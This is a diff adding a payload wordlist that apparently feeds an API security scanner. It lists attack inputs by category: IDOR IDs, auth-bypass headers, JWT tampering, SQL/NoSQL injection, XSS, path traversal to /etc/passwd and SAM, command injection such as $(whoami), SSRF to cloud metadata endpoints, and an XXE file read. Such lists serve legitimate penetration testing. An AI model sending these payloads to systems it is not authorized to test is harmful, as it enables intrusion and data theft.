@@ -1,0 +1,134 @@
+# BOLA (Broken Object Level Authorization) / IDOR Tests
+BOLA:ID:1
+BOLA:ID:2
+BOLA:ID:999
+BOLA:ID:9999
+BOLA:ID:-1
+BOLA:ID:0
+BOLA:ID:admin
+BOLA:ID:test
+BOLA:UUID:00000000-0000-0000-0000-000000000000
+BOLA:UUID:11111111-1111-1111-1111-111111111111
+
+# HTTP Verb Tampering
+VERB:GET_TO_POST
+VERB:POST_TO_GET
+VERB:GET_TO_PUT
+VERB:GET_TO_DELETE
+VERB:POST_TO_PUT
+VERB:POST_TO_PATCH
+VERB:POST_TO_DELETE
+VERB:PUT_TO_POST
+VERB:DELETE_TO_GET
+
+# Mass Assignment
+MASS_ASSIGN:{"isAdmin":true}
+MASS_ASSIGN:{"role":"admin"}
+MASS_ASSIGN:{"admin":true}
+MASS_ASSIGN:{"is_admin":"1"}
+MASS_ASSIGN:{"user_role":"administrator"}
+MASS_ASSIGN:{"permissions":"all"}
+MASS_ASSIGN:{"access_level":"99"}
+MASS_ASSIGN:{"verified":true}
+MASS_ASSIGN:{"approved":true}
+MASS_ASSIGN:{"status":"active"}
+
+# Authentication Bypass
+AUTH_BYPASS:HEADER:X-Original-URL:/admin
+AUTH_BYPASS:HEADER:X-Rewrite-URL:/admin
+AUTH_BYPASS:HEADER:X-Forwarded-For:127.0.0.1
+AUTH_BYPASS:HEADER:X-Originating-IP:127.0.0.1
+AUTH_BYPASS:HEADER:X-Remote-IP:127.0.0.1
+AUTH_BYPASS:HEADER:X-Client-IP:127.0.0.1
+AUTH_BYPASS:HEADER:True-Client-IP:127.0.0.1
+AUTH_BYPASS:HEADER:X-Real-IP:127.0.0.1
+AUTH_BYPASS:HEADER:X-Host:localhost
+AUTH_BYPASS:HEADER:X-Custom-IP-Authorization:127.0.0.1
+
+# Parameter Pollution
+POLLUTION:?id=1&id=2
+POLLUTION:?user=victim&user=attacker
+POLLUTION:?role=user&role=admin
+POLLUTION:?access=read&access=write
+
+# Content-Type tampering
+CONTENT_TYPE:application/xml
+CONTENT_TYPE:text/xml
+CONTENT_TYPE:application/x-www-form-urlencoded
+CONTENT_TYPE:multipart/form-data
+CONTENT_TYPE:text/plain
+
+# API versioning bypass
+VERSION:v1
+VERSION:v2
+VERSION:v3
+VERSION:api/v1
+VERSION:api/v2
+VERSION:api/v3
+
+# JWT manipulation (if JWT detected)
+JWT:NONE_ALGORITHM
+JWT:NULL_SIGNATURE
+JWT:EMPTY_SIGNATURE
+JWT:ALGORITHM_CONFUSION
+
+# Rate limiting bypass
+RATE_LIMIT:X-Forwarded-For
+RATE_LIMIT:X-Originating-IP
+RATE_LIMIT:X-Remote-IP
+RATE_LIMIT:X-Client-IP
+
+# Authorization header manipulation
+AUTHZ:Bearer null
+AUTHZ:Bearer undefined
+AUTHZ:Bearer admin
+AUTHZ:Bearer root
+AUTHZ:Bearer 0
+AUTHZ:Bearer -1
+
+# API key manipulation
+API_KEY:null
+API_KEY:undefined
+API_KEY:0
+API_KEY:admin
+API_KEY:test
+
+# Batch API abuse
+BATCH:[{"method":"GET","url":"/api/users/1"},{"method":"GET","url":"/api/users/2"}]
+BATCH:[{"method":"DELETE","url":"/api/users/1"}]
+
+# SQL injection in API parameters
+SQLI_API:' OR '1'='1
+SQLI_API:" OR "1"="1
+SQLI_API:1' OR '1'='1' --
+SQLI_API:1" OR "1"="1" --
+
+# NoSQL injection in API parameters
+NOSQL_API:{"$ne":null}
+NOSQL_API:{"$gt":""}
+NOSQL_API:{"$regex":".*"}
+
+# XSS in API responses
+XSS_API:<script>alert(1)</script>
+XSS_API:"><script>alert(1)</script>
+XSS_API:javascript:alert(1)
+
+# Path traversal in API
+PATH_TRAV:../../../etc/passwd
+PATH_TRAV:..\\..\\..\\windows\\system32\\config\\sam
+PATH_TRAV:....//....//....//etc/passwd
+
+# Command injection in API
+CMDI_API:;ls
+CMDI_API:|whoami
+CMDI_API:`id`
+CMDI_API:$(whoami)
+
+# SSRF in API
+SSRF_API:http://localhost
+SSRF_API:http://127.0.0.1
+SSRF_API:http://169.254.169.254
+SSRF_API:http://metadata.google.internal
+
+# XXE in API (when Content-Type is XML)
+XXE_API:<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
